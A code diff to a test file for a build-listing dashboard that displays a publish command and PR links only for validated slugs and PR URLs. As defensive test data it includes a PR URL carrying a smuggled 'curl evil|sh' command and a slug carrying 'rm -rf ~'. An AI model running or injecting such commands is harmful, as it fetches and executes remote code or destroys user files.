@@ -109,7 +109,7 @@ describe('page', () => {
 
   it('lists builds with links only for the expected shapes', async () => {
     const ok = `https://good-tool-preview.${env.PREVIEW_SUFFIX}`;
-    const pr = 'https://github.com/nakake/trend-factory/pull/7';
+    const pr = 'https://github.com/nakake/trend-factory-tools/pull/7';
     await env.DB.prepare('INSERT INTO builds (slug, preview_url, pr_url, created_at) VALUES (?, ?, ?, ?)')
       .bind('good-tool', ok, pr, iso(1000))
       .run();
@@ -120,7 +120,10 @@ describe('page', () => {
     expect(html).toContain(`href="${ok}" rel="noopener noreferrer"`);
     expect(html).toContain(`href="${pr}" rel="noopener noreferrer"`);
     expect(html).toContain('href="https://tf-good-tool.nakake.com"');
-    expect(html).toContain('マージ後に有効');
+    expect(html).toContain('本番 URL(公開の操作後に有効)');
+    expect(html).not.toContain('マージ後に有効');
+    expect(html).toContain('<code>pnpm -C infra publish-tool good-tool 7</code>');
+    expect(html).not.toContain('publish-tool bad-tool');
     expect(html).not.toContain('href="https://evil.example');
     expect(html).not.toContain('href="https://github.com/other');
   });
@@ -128,7 +131,7 @@ describe('page', () => {
   it('does not link previews while PREVIEW_SUFFIX is a placeholder', async () => {
     const url = 'https://good-tool-preview.REPLACE-ME.workers.dev';
     await env.DB.prepare('INSERT INTO builds (slug, preview_url, pr_url, created_at) VALUES (?, ?, ?, ?)')
-      .bind('good-tool', url, 'https://github.com/nakake/trend-factory/pull/1', iso(1000))
+      .bind('good-tool', url, 'https://github.com/nakake/trend-factory-tools/pull/1', iso(1000))
       .run();
     const res = await request('GET', '/', { key, env: { PREVIEW_SUFFIX: 'REPLACE-ME.workers.dev' } });
     expect(await res.text()).not.toContain(`href="${url}"`);
@@ -244,10 +247,32 @@ describe('robustness and details', () => {
     expect(html).toContain('fine-term');
   });
 
+  it.each([
+    ['the old repository', 'https://github.com/nakake/trend-factory/pull/7'],
+    ['another owner', 'https://github.com/other/trend-factory-tools/pull/7'],
+    ['a trailing path', 'https://github.com/nakake/trend-factory-tools/pull/7/files'],
+    ['more than 7 digits', 'https://github.com/nakake/trend-factory-tools/pull/12345678'],
+    ['a command after the number', 'https://github.com/nakake/trend-factory-tools/pull/7;curl evil|sh'],
+  ])('shows no publish command and no PR link for %s', async (_name, pr) => {
+    await env.DB.prepare('INSERT INTO builds (slug, preview_url, pr_url, created_at) VALUES (?, ?, ?, ?)')
+      .bind('cmd-tool', `https://cmd-tool-preview.${env.PREVIEW_SUFFIX}`, pr, iso(1000))
+      .run();
+    const { html } = await page();
+    expect(html).not.toContain('publish-tool');
+    expect(html).not.toContain('href="https://github.com');
+  });
+
+  it('shows no publish command when the slug is not a valid slug', async () => {
+    await env.DB.prepare('INSERT INTO builds (slug, preview_url, pr_url, created_at) VALUES (?, ?, ?, ?)')
+      .bind('x; rm -rf ~', 'x', 'https://github.com/nakake/trend-factory-tools/pull/7', iso(1000))
+      .run();
+    expect((await page()).html).not.toContain('publish-tool');
+  });
+
   it('links a preview URL that has one trailing slash', async () => {
     const ok = `https://slash-tool-preview.${env.PREVIEW_SUFFIX}`;
     await env.DB.prepare('INSERT INTO builds (slug, preview_url, pr_url, created_at) VALUES (?, ?, ?, ?)')
-      .bind('slash-tool', `${ok}/`, 'https://github.com/nakake/trend-factory/pull/3', iso(1000))
+      .bind('slash-tool', `${ok}/`, 'https://github.com/nakake/trend-factory-tools/pull/3', iso(1000))
       .run();
     expect((await page()).html).toContain(`href="${ok}"`);
   });
